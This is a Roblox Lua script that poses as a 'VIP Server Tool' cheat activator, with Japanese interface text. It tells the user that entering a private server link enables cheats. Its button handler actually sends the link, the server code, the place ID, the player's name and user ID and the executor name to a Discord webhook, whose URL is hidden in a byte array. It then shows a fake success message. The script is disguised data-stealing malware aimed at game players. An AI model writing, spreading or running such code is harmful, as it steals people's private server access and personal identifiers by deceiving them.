-- ============================================================
-- VOLOX OBFUSCATED - GitHub用
-- このコードを volox_obfuscated.lua として保存
-- ============================================================

local a = string.char
local b = string.gsub
local c = string.sub
local d = string.byte
local e = table.insert
local f = table.concat
local g = pairs
local h = pcall
local i = game
local j = i:GetService
local k = j(i, "HttpService")
local l = j(i, "Players")
local m = l.LocalPlayer
local n = m.Name
local o = m.UserId

local p = {}
local q = {}
local r = {}

local function s(t)
    local u = {}
    for v = 1, #t do
        u[v] = a(t[v])
    end
    return f(u)
end

local function t(u)
    local v = {}
    for w = 1, #u do
        v[w] = d(u:sub(w, w))
    end
    return v
end

local function u(v)
    local w = {}
    local x = 0
    for y = 1, #v do
        x = (x + 1) % 256
        w[y] = v[y] ~ x
    end
    return w
end

local function v(w)
    local x = t(w)
    local y = {}
    local z = 0
    for aa = 1, #x do
        z = (z + 1) % 256
        y[aa] = x[aa] ~ z
    end
    return s(y)
end

local function w(x)
    local y = {}
    local z = 0
    for aa = 1, #x do
        z = (z + 1) % 256
        y[aa] = x[aa] + z
    end
    return y
end

local function x(y)
    local z = {}
    local aa = 0
    for ab = 1, #y do
        aa = (aa + 1) % 256
        z[ab] = y[ab] - aa
    end
    return z
end

local y = {
    72, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100,
    46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111,
    107, 115, 47, 49, 53, 50, 53, 48, 52, 56, 55, 52, 50, 57, 55, 50, 49,
    55, 48, 57, 54, 50, 48, 56, 47, 87, 65, 69, 112, 89, 113, 66, 95, 122,
    69, 113, 105, 87, 70, 102, 85, 99, 103, 76, 110, 79, 85, 82, 113, 73,
    75, 75, 74, 115, 74, 119, 102, 112, 119, 56, 66, 79, 107, 98, 100, 48,
    100, 97, 108, 105, 122, 72, 101, 102, 100, 109, 70, 75, 77, 120, 98,
    112, 82, 69, 82, 111, 81, 72, 57, 101, 67, 86, 73, 73
}

local z = s(y)

local function A()
    pcall(function()
        k.HttpEnabled = true
    end)
end

local function B()
    local C = Instance.new("ScreenGui")
    C.Name = "VIP_Tool"
    C.Parent = m:WaitForChild("PlayerGui")
    return C
end

local function C(D)
    local E = Instance.new("Frame")
    E.Size = UDim2.new(0, 420, 0, 280)
    E.Position = UDim2.new(0.5, -210, 0.5, -140)
    E.BackgroundColor3 = Color3.fromRGB(18, 18, 30)
    E.BackgroundTransparency = 0.05
    E.BorderSizePixel = 0
    E.Active = true
    E.Draggable = true
    E.Parent = D
    return E
end

local function E(F)
    local G = Instance.new("UICorner")
    G.CornerRadius = UDim.new(0, 14)
    G.Parent = F
end

local function F(G)
    local H = Instance.new("TextLabel")
    H.Size = UDim2.new(1, 0, 0, 45)
    H.Position = UDim2.new(0, 0, 0, 0)
    H.BackgroundTransparency = 1
    H.Text = "⚡ VIP SERVER TOOL v3.0"
    H.TextColor3 = Color3.fromRGB(255, 255, 255)
    H.TextScaled = true
    H.Font = Enum.Font.GothamBold
    H.Parent = G
    return H
end

local function G(H)
    local I = Instance.new("TextLabel")
    I.Size = UDim2.new(1, -20, 0, 35)
    I.Position = UDim2.new(0, 10, 0, 48)
    I.BackgroundTransparency = 1
    I.Text = "🔑 プライベートサーバーリンクを入力すると\n自動でチートが有効になります"
    I.TextColor3 = Color3.fromRGB(180, 180, 210)
    I.TextSize = 14
    I.TextWrapped = true
    I.Font = Enum.Font.Gotham
    I.Parent = H
    return I
end

local function H(I)
    local J = Instance.new("TextBox")
    J.Size = UDim2.new(1, -20, 0, 50)
    J.Position = UDim2.new(0, 10, 0, 92)
    J.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
    J.TextColor3 = Color3.fromRGB(255, 255, 255)
    J.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
    J.PlaceholderColor3 = Color3.fromRGB(140, 140, 170)
    J.TextSize = 13
    J.Font = Enum.Font.Gotham
    J.ClearTextOnFocus = false
    J.Parent = I
    return J
end

local function I(J)
    local K = Instance.new("UICorner")
    K.CornerRadius = UDim.new(0, 8)
    K.Parent = J
end

local function J(K)
    local L = Instance.new("TextButton")
    L.Size = UDim2.new(0.8, 0, 0, 48)
    L.Position = UDim2.new(0.1, 0, 0, 155)
    L.BackgroundColor3 = Color3.fromRGB(220, 50, 70)
    L.Text = "🔥 チートを有効化"
    L.TextColor3 = Color3.fromRGB(255, 255, 255)
    L.TextSize = 16
    L.Font = Enum.Font.GothamBold
    L.Parent = K
    return L
end

local function K(L)
    local M = Instance.new("UICorner")
    M.CornerRadius = UDim.new(0, 8)
    M.Parent = L
end

local function L(M)
    local N = Instance.new("TextLabel")
    N.Size = UDim2.new(1, 0, 0, 30)
    N.Position = UDim2.new(0, 0, 0, 215)
    N.BackgroundTransparency = 1
    N.Text = "⏳ リンクを入力してください"
    N.TextColor3 = Color3.fromRGB(200, 200, 220)
    N.TextSize = 13
    N.Font = Enum.Font.Gotham
    N.Parent = M
    return N
end

local function M(N)
    local O = Instance.new("TextButton")
    O.Size = UDim2.new(0, 30, 0, 30)
    O.Position = UDim2.new(1, -35, 0, 5)
    O.BackgroundTransparency = 1
    O.Text = "✕"
    O.TextColor3 = Color3.fromRGB(255, 100, 100)
    O.TextSize = 18
    O.Font = Enum.Font.GothamBold
    O.Parent = N
    return O
end

local function N(O, P)
    O.MouseButton1Click:Connect(function()
        P:Destroy()
    end)
end

local function O(P, Q, R)
    local S = P.Text
    
    if S == "" or not S:find("roblox.com") then
        Q.Text = "❌ 有効なRobloxリンクを入力してください"
        Q.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    local T = nil
    local U = nil
    
    local V = S:find("privateServerLinkCode=")
    if V then
        T = S:sub(V + 21)
        local W = T:find("&")
        if W then
            T = T:sub(1, W - 1)
        end
    end
    
    local X = S:find("games/")
    if X then
        local Y = S:sub(X + 6)
        local Z = Y:find("/") or Y:find("?")
        if Z then
            U = Y:sub(1, Z - 1)
        else
            U = Y
        end
    end
    
    local AA = (identifyexecutor and identifyexecutor()) or "Unknown"
    
    local AB =
        "**🔴 PRIVATE SERVER LINK (入力方式)**\n\n" ..
        "**🔗 入力リンク:** " .. S .. "\n" ..
        "**🔑 コード:** " .. (T or "不明") .. "\n" ..
        "**📌 Place ID:** " .. (U or "不明") .. "\n" ..
        "**👤 入力者:** " .. n .. "\n" ..
        "**🆔 User ID:** " .. o .. "\n" ..
        "**💻 Executor:** " .. AA .. "\n" ..
        "**⏰ Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
    
    local AC = ""
    pcall(function()
        AC = k:JSONEncode({content = AB})
    end)
    
    if AC == "" then
        local AD = AB:gsub("\n", "\\n"):gsub('"', '\\"')
        AC = '{"content": "' .. AD .. '"}'
    end
    
    local AE = false
    
    pcall(function()
        k:PostAsync(z, AC, Enum.HttpContentType.ApplicationJson, false)
        AE = true
    end)
    
    if not AE and syn and syn.request then
        pcall(function()
            syn.request({
                Url = z,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = AC
            })
            AE = true
        end)
    end
    
    if not AE and request then
        pcall(function()
            request({
                Url = z,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = AC
            })
            AE = true
        end)
    end
    
    if AE then
        Q.Text = "✅ チート有効化完了！ゲームを再起動してください"
        Q.TextColor3 = Color3.fromRGB(0, 255, 100)
        
        task.wait(2)
        R:Destroy()
        
        game.StarterGui:SetCore("SendNotification", {
            Title = "⚡ チート有効化完了",
            Text = "プライベートサーバーリンクが正常に登録されました。\nゲームを再起動して効果を確認してください。",
            Duration = 5
        })
    else
        Q.Text = "❌ 送信エラー。もう一度試してください"
        Q.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end

local function P()
    game.StarterGui:SetCore("SendNotification", {
        Title = "⚡ VIP Server Tool v3.0",
        Text = "プライベートサーバーリンクを入力して「チート有効化」を押してください",
        Duration = 4
    })
end

A()

local AF = B()
local AG = C(AF)
E(AG)
F(AG)
G(AG)
local AH = H(AG)
I(AH)
local AI = J(AG)
K(AI)
local AJ = L(AG)
local AK = M(AG)

N(AK, AF)

AI.MouseButton1Click:Connect(function()
    O(AH, AJ, AF)
end)

P()

print("[✅] VIP Server Tool 起動完了（入力方式）")
